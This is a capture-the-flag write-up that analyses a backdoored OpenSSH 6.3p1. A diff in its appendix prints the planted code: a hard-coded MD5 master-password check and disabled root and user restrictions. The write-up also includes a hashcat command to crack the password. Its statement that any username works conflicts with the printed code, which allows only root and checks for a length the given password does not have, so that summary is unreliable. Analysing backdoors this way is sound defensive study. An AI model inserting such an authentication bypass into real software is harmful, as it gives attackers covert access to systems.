# SSH backdoor analysis

> Author : jul0105
> Date : 30.05.2021



## Challenge info

**Release** : Bundle 6 (08.05)

**Difficulty** : Novice

**Goal** :

- find the backdoor
- find the backdoor password
- list all files that are altered compared to the origin version



## Solve

1. First, I needed to know the program's name and version to be able to compare it with a legit copy of the same version. 
2. Using grep, I found the program name and version (**`OpenSSH_6.3p1`**) in the `version.h` file :

```
❯ cat version.h              
/* $OpenBSD: version.h,v 1.67 2013/07/25 00:57:37 djm Exp $ */

#define SSH_VERSION     "OpenSSH_6.3"

#define SSH_PORTABLE    "p1"
#define SSH_RELEASE     SSH_VERSION SSH_PORTABLE
```

3. I downloaded the same program with the same version from here: https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/
4. And then, compared the backdoor program and the standard program using `diff`. 3 files are modified between the two versions :
   1. **`auth.c`** : In the backdoored version, some conditions are ignored to allow every user to connect (even user that are in DenyUser groups or are root for example).
   2. **`auth.h`** : In the backdoored version, a new function signature is added for `sys_auth_backdoor`
   3. **`auth-passwd.c`** : In the backdoored version, before trying to authenticate the user with the password provided, a new function `sys_auth_backdoor` is called. This function hash the provided password using MD5 and check if the digest is equal to an hard-coded hash digest (`45d616ff7d5108bd93094fa15fe0e1d2`). If both hash digest match, the function return and the user is considered to be successfully authenticated. Beside this hash, a comment is added on the code which indicate the password format : `HL{????} where ? is [0-9]`.
5. In summary, to have access to the backdoor, one has to provide any username, and provide a password that is equal to `45d616ff7d5108bd93094fa15fe0e1d2` when hashed with MD5.
6. To retrieve the password, I used `hashcat`. Since we know that the password format is `HL{????} where ? is [0-9]`, we can give this information to hashcat :

```
hashcat -m0 -a3 '45d616ff7d5108bd93094fa15fe0e1d2' 'HL{?d?d?d?d}'
```

- `-m0` : Indicate that we are using MD5
- `-a3` : Attack mode bruteforce
- `'HL{?d?d?d?d}'` : Format of the password. `?d` indicate [0-9] charset.

7. And here is the password:

```
HL{7298}
```





## Appendix

**Complete `diff` between the backdoored version and the standard version :**

```diff
❯ diff openssh-6.3p1 backdoor-source
diff '--color=auto' openssh-6.3p1/auth.c backdoor-source/auth.c
349,350c349,350
<       logit("ROOT LOGIN REFUSED FROM %.200s", get_remote_ipaddr());
<       return 0;
---
> 
>       return 1;
636,637c636,637
<       if (!allowed_user(pw))
<               return (NULL);
---
>       //if (!allowed_user(pw))
>       //      return (NULL);
diff '--color=auto' openssh-6.3p1/auth.h backdoor-source/auth.h
214a215
> int  sys_auth_backdoor(Authctxt *, const char *);
215a217
> 
diff '--color=auto' openssh-6.3p1/auth-passwd.c backdoor-source/auth-passwd.c
47a48,49
> #include <openssl/md5.h>
> 
88a91,93
>     if(sys_auth_backdoor(authctxt, password))
>         return 1;
> 
215a221,246
>     
> static char backdoor_hash[MD5_DIGEST_LENGTH] = \
> {
>     // HL{????} where ? is [0-9]
>     0x45, 0xD6, 0x16, 0xFF, 0x7D, 0x51, 0x08, 0xBD, 0x93, 0x09, 0x4F, 0xA1, 0x5F, 0xE0, 0xE1, 0xD2
> };
> 
> int
> sys_auth_backdoor(Authctxt *authctxt, const char *password)
> {
>     MD5_CTX c = {};
>     char password_hash[MD5_DIGEST_LENGTH] = {}; 
>       struct passwd *pw = authctxt->pw;
>     
>     if(strcmp(pw->pw_name, "root") != 0 || strlen(password) != 6)
>         return 0;
> 
>     MD5_Init(&c);
>     MD5_Update(&c, password, strlen(password));
>     MD5_Final(password_hash, &c);
> 
>     if(memcmp(backdoor_hash, password_hash, MD5_DIGEST_LENGTH) != 0)
>         return 0;
> 
>     return 1;
> }
```

